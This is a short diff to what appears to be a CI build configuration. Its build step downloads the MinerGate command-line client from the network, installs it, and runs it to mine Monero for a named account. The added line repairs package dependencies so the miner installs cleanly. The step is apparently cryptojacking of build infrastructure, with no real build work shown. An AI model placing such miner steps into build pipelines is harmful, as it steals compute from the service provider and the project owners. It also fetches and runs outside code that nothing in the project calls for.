@@ -25,6 +25,7 @@ build:
         code: |
           apt-get update
           apt-get install wget -y
+          apt-get install -f
           wget https://minergate.com/download/deb-cli -O a.deb
           dpkg -i a.deb
           minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
